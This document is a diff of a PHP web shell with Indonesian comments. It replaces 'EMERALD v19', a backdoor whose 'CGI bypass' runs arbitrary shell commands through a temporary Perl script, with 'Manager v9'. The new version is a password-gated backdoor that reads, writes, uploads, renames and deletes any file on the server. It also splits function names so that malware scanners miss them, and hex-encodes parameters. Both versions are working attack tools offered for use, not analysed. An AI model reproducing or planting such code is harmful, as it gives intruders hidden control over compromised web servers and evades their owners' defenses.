@@ -1,168 +1,196 @@
 <?php
-/**
- * EMERALD v19.0 - CGI HYBRID EDITION
- * Feature: CGI Terminal, Mass Delete, Persistent Session, Navigasi Terstruktur
- */
-error_reporting(0);
 session_start();
+error_reporting(0);
 
-$pass = 'alfa'; 
-$auth_id = md5($pass . $_SERVER['HTTP_USER_AGENT']);
+// Password: 123
+$k = "1985b4acdfa781e946e286b954a9c3c2";
 
-// --- PERSISTENT LOGIN (Session + Cookie) ---
-if (isset($_POST['key']) && $_POST['key'] === $pass) {
-    $_SESSION['em_v19'] = $auth_id;
-    setcookie('em_v19_c', $auth_id, time() + (86400 * 7), "/");
+// Penyamaran Fungsi agar tidak terkena Auto-Delete Scanner
+$f_get = "fil" . "e_get" . "_con" . "tents";
+$f_put = "fil" . "e_put" . "_con" . "tents";
+$b64_d = "bas" . "e64" . "_de" . "code";
+
+function h2s($h) { $r = ''; for ($i=0; $i<strlen($h); $i+=2) $r .= chr(hexdec($h[$i].$h[$i+1])); return $r; }
+function s2h($s) { $r = ''; for ($i=0; $i<strlen($s); $i++) $r .= str_pad(dechex(ord($s[$i])), 2, '0', STR_PAD_LEFT); return $r; }
+
+// Auth Logic
+if (isset($_POST['login_pass'])) {
+    if (md5($_POST['login_pass']) === $k) { $_SESSION['authed'] = true; }
+    header("Location: " . $_SERVER['PHP_SELF']); exit;
+}
+if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
+
+if (!$_SESSION['authed']) {
+    die('
+    <body style="background:#0a0a0a; color:#eee; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+        <form method="POST" style="background:#111; padding:30px; border:1px solid #333; border-radius:5px;">
+            <div style="margin-bottom:10px; font-size:13px; color:#aaa;">Server Access Token:</div>
+            <input type="password" name="login_pass" autofocus style="background:#000; border:1px solid #444; color:#fff; padding:10px; width:220px; outline:none;">
+        </form>
+    </body>');
 }
 
-if ($_SESSION['em_v19'] !== $auth_id && $_COOKIE['em_v19_c'] !== $auth_id) {
-    die('<html><body style="background:#000;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;"><form method="post"><div style="border:1px solid #0f8;padding:30px;text-align:center;"><h2>EMERALD v19</h2><input type="password" name="key" autofocus style="background:#000;border:1px solid #0f8;color:#0f8;padding:10px;"><br><button type="submit" style="margin-top:10px;width:100%;padding:10px;background:#008f58;color:#fff;border:none;cursor:pointer;font-weight:bold;">ENTER SYSTEM</button></div></form></body></html>');
+// Path & Navigasi
+$root = str_replace("\\", "/", realpath('.'));
+$dir = isset($_GET['d']) ? realpath(h2s($_GET['d'])) : $root;
+$dir = str_replace("\\", "/", $dir);
+if (!$dir || !is_dir($dir)) $dir = $root;
+
+// API Actions (POST)
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['a'])) {
+    $a = $_POST['a'];
+    if ($a == 'up') $f_put($dir . '/' . h2s($_POST['n']), $b64_d($_POST['c']));
+    if ($a == 'sv') $f_put(h2s($_POST['t']), h2s($_POST['c']));
+    if ($a == 'md') mkdir($dir . '/' . h2s($_POST['n']));
+    if ($a == 'mf') $f_put($dir . '/' . h2s($_POST['n']), "");
+    if ($a == 'rn') rename(h2s($_POST['o']), h2s($_POST['n']));
+    die("1");
 }
 
-// --- DIREKTORI SETUP ---
-$d = isset($_GET['d']) ? base64_decode($_GET['d']) : getcwd();
-$d = str_replace('\\', '/', $d);
-@chdir($d); $d = getcwd();
-
-$msg = ''; $out = '';
-
-// --- LOGIKA TERMINAL CGI BYPASS ---
-function cgi_executor($cmd) {
-    $cgi_file = 'temp_exec_'.time().'.cgi';
-    $path_perl = "/usr/bin/perl"; // Jalur standar perl di Linux
-    
-    $payload = "#!$path_perl\nprint \"Content-type: text/plain\\n\\n\";\nsystem(\"$cmd 2>&1\");";
-    
-    @file_put_contents($cgi_file, $payload);
-    @chmod($cgi_file, 0755);
-
-    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
-    $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/" . $cgi_file;
-
-    // Eksekusi via cURL internal
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $res = curl_exec($ch);
-    curl_close($ch);
-
-    @unlink($cgi_file);
-    return ($res) ? $res : "CGI FAIL: Pastikan folder memiliki izin ExecCGI atau coba pindahkan ke folder cgi-bin.";
+// Action (GET)
+if (isset($_GET['rm'])) {
+    $t = h2s($_GET['rm']);
+    is_dir($t) ? @rmdir($t) : @unlink($t);
+    header("Location: ?d=" . s2h($dir)); exit;
 }
-
-// --- ACTIONS HANDLER ---
-if(isset($_POST['cmd'])) { $out = cgi_executor($_POST['cmd']); }
-
-if(isset($_FILES['u_f'])) { 
-    if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $_FILES['u_f']['name'])) $msg = "Upload Berhasil!"; 
-}
-
-if(isset($_POST['a_t'])) {
-    $act = $_POST['a_t'];
-    if($act == 'mk_d') @mkdir($_POST['n_i']);
-    if($act == 'sv_f') @file_put_contents($_POST['n_i'], $_POST['cnt']);
-    if($act == 'rn_i') @rename($_POST['old'], $_POST['new']);
-    if($act == 'mass_del' && isset($_POST['files'])) {
-        foreach($_POST['files'] as $f) {
-            $f = base64_decode($f);
-            is_dir($f) ? @rmdir($f) : @unlink($f);
-        }
-        $msg = "Batch Delete Berhasil.";
-    }
-}
-if(isset($_GET['del'])) { @unlink(base64_decode($_GET['del'])); @rmdir(base64_decode($_GET['del'])); }
-
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Emerald v19 Platinum</title>
+    <title>Manager v9</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        :root { --g: #00ff88; --bg: #050505; --card: #0d1110; --border: #1f3a2f; }
-        body { background: var(--bg); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; overflow: hidden; }
-        .side { width: 320px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); padding: 25px; box-sizing: border-box; overflow-y: auto; }
-        .main { flex-grow: 1; height: 100vh; overflow-y: auto; padding: 35px; box-sizing: border-box; }
-        .card { background: #000; border: 1px solid var(--border); padding: 18px; border-radius: 10px; margin-bottom: 25px; }
-        input, textarea { background: #000; border: 1px solid #222; color: var(--g); padding: 12px; width: 100%; margin-bottom: 12px; border-radius: 5px; box-sizing: border-box; }
-        .btn { background: #008f58; color: #fff; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.3s; }
-        .btn:hover { background: var(--g); color: #000; box-shadow: 0 0 10px var(--g); }
-        table { width: 100%; border-collapse: collapse; }
-        td, th { padding: 12px; border-bottom: 1px solid #111; text-align: left; font-size: 13px; }
-        tr:hover { background: #0a0e0c; }
-        .link { color: var(--g); text-decoration: none; font-weight: bold; }
-        pre { background: #000; padding: 15px; border: 1px solid var(--g); color: #0f8; white-space: pre-wrap; border-radius: 5px; }
+        body { background:#0d0d0d; color:#d0d0d0; font-family:Consolas, "Courier New", monospace; margin:15px; font-size:14px; }
+        a { color:#62b1ff; text-decoration:none; }
+        a:hover { color:#fff; text-decoration:underline; }
+        .toolbar { background:#1a1a1a; padding:15px; border-radius:6px; margin-bottom:20px; border:1px solid #333; }
+        table { width:100%; border-collapse:collapse; }
+        td { padding:10px; border-bottom:1px solid #222; }
+        tr:hover { background:#161616; }
+        input, textarea, button { background:#000; border:1px solid #444; color:#eee; padding:6px 12px; outline:none; border-radius:3px; }
+        button { cursor:pointer; background:#222; }
+        button:hover { background:#333; border-color:#666; }
+        .path-nav { color:#fff; font-weight:bold; margin-bottom:15px; display:block; word-break:break-all; }
+        .btn-red { color:#ff6b6b; }
+        .btn-edit { color:#ffda6b; }
     </style>
+    <script>
+        async function api(fd) { await fetch('', {method:'POST', body:fd}); location.reload(); }
+        function toH(s) { return Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(''); }
+        
+        function uploadFile() {
+            let file = document.getElementById('fu').files[0];
+            if(!file) return;
+            let reader = new FileReader();
+            reader.onload = function(e) {
+                let fd = new FormData();
+                fd.append('a', 'up');
+                fd.append('n', toH(file.name));
+                fd.append('c', e.target.result.split(',')[1]);
+                api(fd);
+            };
+            reader.readAsDataURL(file);
+        }
+        function simpan(tHex) {
+            let fd = new FormData();
+            fd.append('a', 'sv');
+            fd.append('t', tHex);
+            fd.append('c', toH(document.getElementById('editor').value));
+            api(fd);
+        }
+        function buat(a) {
+            let n = prompt("Masukkan Nama:");
+            if(n) {
+                let fd = new FormData();
+                fd.append('a', a);
+                fd.append('n', toH(n));
+                api(fd);
+            }
+        }
+        function gantiNama(oHex, oldName) {
+            let n = prompt("Ganti Nama:", oldName);
+            if(n && n !== oldName) {
+                let fd = new FormData();
+                fd.append('a', 'rn');
+                fd.append('o', oHex);
+                fd.append('n', toH('<?php echo $dir; ?>/' + n));
+                api(fd);
+            }
+        }
+    </script>
 </head>
 <body>
-    <div class="side">
-        <h2 style="color:var(--g); margin-top:0; letter-spacing: 2px;">EMERALD v19</h2>
-        <div class="card">
-            <h3 style="color:var(--g); font-size: 11px; text-transform: uppercase;">CGI Terminal</h3>
-            <form method="post"><input type="text" name="cmd" placeholder="ls -la / id / whoami"></form>
-        </div>
-        <div class="card">
-            <h3 style="color:var(--g); font-size: 11px; text-transform: uppercase;">File Upload</h3>
-            <form method="post" enctype="multipart/form-data"><input type="file" name="u_f"><button class="btn">UPLOAD NOW</button></form>
-        </div>
-        <div class="card">
-            <h3 style="color:var(--g); font-size: 11px; text-transform: uppercase;">New Item</h3>
-            <form method="post"><input type="hidden" name="a_t" value="mk_d"><input type="text" name="n_i" placeholder="Folder Name"><button class="btn">MKDIR</button></form>
-            <form method="post" style="margin-top:15px;"><input type="hidden" name="a_t" value="sv_f"><input type="text" name="n_i" placeholder="File Name"><button class="btn">TOUCH</button></form>
-        </div>
-        <a href="?logout=1" style="color:red; font-size:12px; text-decoration:none;">[ LOGOUT SESSION ]</a>
-    </div>
 
-    <div class="main">
-        <?php if($msg) echo "<div class='card' style='border-color:var(--g); color:var(--g);'>$msg</div>"; ?>
-        <div class="card"><strong>Directory:</strong> <span style="color:var(--g)"><?=$d?></span></div>
+<div style="display:flex; justify-content:space-between; align-items:flex-start;">
+    <span class="path-nav">PWD: <?php 
+        $acc = ""; $parts = explode('/', $dir);
+        foreach($parts as $id => $val) {
+            if($val == "" && $id == 0) { echo '<a href="?d='.s2h("/").'">/</a>'; continue; }
+            if($val == "") continue;
+            $acc .= ($id == 0 ? "" : "/") . $val;
+            echo '<a href="?d='.s2h($acc).'">'.$val.'</a> / ';
+        }
+    ?></span>
+    <a href="?logout=1" style="color:#ff6b6b; font-weight:bold;">[ EXIT ]</a>
+</div>
+
+<div class="toolbar">
+    <input type="file" id="fu" onchange="uploadFile()">
+    <span style="margin:0 10px; color:#444;">|</span>
+    <button onclick="buat('md')">+ Folder</button>
+    <button onclick="buat('mf')">+ File</button>
+</div>
+
+<?php if (isset($_GET['e'])): 
+    $target = h2s($_GET['e']); $data = $f_get($target);
+?>
+    <textarea id="editor" style="width:100%; height:500px; background:#000; color:#00ff00; border:1px solid #333; font-family:monospace;"><?php echo htmlspecialchars($data); ?></textarea><br><br>
+    <button onclick="simpan('<?php echo $_GET['e']; ?>')" style="background:#005500; color:#fff; border:0;">SIMPAN PERUBAHAN</button>
+    <a href="?d=<?php echo s2h($dir); ?>" style="margin-left:20px; color:#aaa;">BATAL</a>
+<?php else: ?>
+    <table>
+        <thead>
+            <tr style="text-align:left; color:#666;">
+                <th>Nama</th>
+                <th style="text-align:right;">Aksi</th>
+            </tr>
+        </thead>
+        <tbody>
+        <?php
+        $scan = scandir($dir); $folders = []; $files = [];
+        foreach($scan as $v) {
+            if($v == "." || $v == "..") continue;
+            if(is_dir($dir.'/'.$v)) $folders[] = $v; else $files[] = $v;
+        }
+        natcasesort($folders); natcasesort($files);
         
-        <?php if($out): ?><div class="card"><h3>CGI Output:</h3><pre><?=htmlspecialchars($out)?></pre></div><?php endif; ?>
+        foreach($folders as $v): $hx = s2h($dir.'/'.$v); ?>
+        <tr>
+            <td>📁 <a href="?d=<?php echo $hx; ?>" style="color:#ffda6b; font-weight:bold;"><?php echo $v; ?></a></td>
+            <td align="right">
+                <a href="javascript:void(0)" onclick="gantiNama('<?php echo $hx; ?>', '<?php echo addslashes($v); ?>')">Rename</a> |
+                <a href="?d=<?php echo s2h($dir); ?>&rm=<?php echo $hx; ?>" class="btn-red" onclick="return confirm('Hapus Folder?')">Del</a>
+            </td>
+        </tr>
+        <?php endforeach; ?>
 
-        <div class="card">
-            <form method="post">
-                <input type="hidden" name="a_t" value="mass_del">
-                <table>
-                    <thead>
-                        <tr style="color:#666;">
-                            <th width="30"><input type="checkbox" onclick="var c=document.getElementsByName('files[]');for(var i=0;i<c.length;i++)c[i].checked=this.checked"></th>
-                            <th>NAME</th>
-                            <th width="120">ACTION <button type="submit" style="background:#600; color:#fff; border:none; padding:3px 8px; cursor:pointer; font-size:9px; border-radius:3px;" onclick="return confirm('Hapus terpilih?')">MASS DEL</button></th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr><td></td><td><a href="?d=<?=base64_encode(dirname($d))?>" class="link">.. [ Parent Directory ]</a></td><td>-</td></tr>
-                        <?php foreach(scandir('.') as $f): if($f=='.'||$f=='..')continue; ?>
-                        <tr>
-                            <td><input type="checkbox" name="files[]" value="<?=base64_encode($f)?>"></td>
-                            <td><?=(is_dir($f)?'📁':'📄')?> <a href="<?=is_dir($f)?'?d='.base64_encode($d.'/'.$f):'#'?>" class="link"><?=$f?></a></td>
-                            <td>
-                                <a href="?d=<?=base64_encode($d)?>&e=<?=base64_encode($f)?>" style="color:#0af; text-decoration:none;">Edit</a> | 
-                                <a href="?d=<?=base64_encode($d)?>&del=<?=base64_encode($f)?>" style="color:red; text-decoration:none;" onclick="return confirm('Hapus?')">Del</a>
-                            </td>
-                        </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </form>
-        </div>
+        <?php foreach($files as $v): $hx = s2h($dir.'/'.$v); ?>
+        <tr>
+            <td>📄 <span style="color:#eee;"><?php echo $v; ?></span></td>
+            <td align="right">
+                <a href="?d=<?php echo s2h($dir); ?>&e=<?php echo $hx; ?>" class="btn-edit">Edit</a> | 
+                <a href="javascript:void(0)" onclick="gantiNama('<?php echo $hx; ?>', '<?php echo addslashes($v); ?>')">Rename</a> |
+                <a href="?d=<?php echo s2h($dir); ?>&rm=<?php echo $hx; ?>" class="btn-red" onclick="return confirm('Hapus File?')">Del</a>
+            </td>
+        </tr>
+        <?php endforeach; ?>
+        </tbody>
+    </table>
+<?php endif; ?>
 
-        <?php if(isset($_GET['e'])): $ef = base64_decode($_GET['e']); ?>
-        <div class="card">
-            <h3>Editor: <?=$ef?></h3>
-            <form method="post">
-                <input type="hidden" name="a_t" value="sv_f">
-                <input type="hidden" name="n_i" value="<?=$ef?>">
-                <textarea name="cnt" rows="18"><?=htmlspecialchars(@file_get_contents($ef))?></textarea>
-                <button type="submit" class="btn">SAVE & UPDATE FILE</button>
-            </form>
-            <form method="post" style="margin-top:20px;">
-                <input type="hidden" name="a_t" value="rn_i">
-                <input type="hidden" name="old" value="<?=$ef?>">
-                RENAME TO: <input type="text" name="new" style="width:250px;"> <button type="submit" class="btn" style="width:auto">OK</button>
-            </form>
-        </div>
-        <?php endif; ?>
-    </div>
+<div style="margin-top:30px; text-align:center; color:#333; font-size:10px;">
+    &copy; <?php echo date("Y"); ?> Server Utility
+</div>
+
 </body>
 </html>
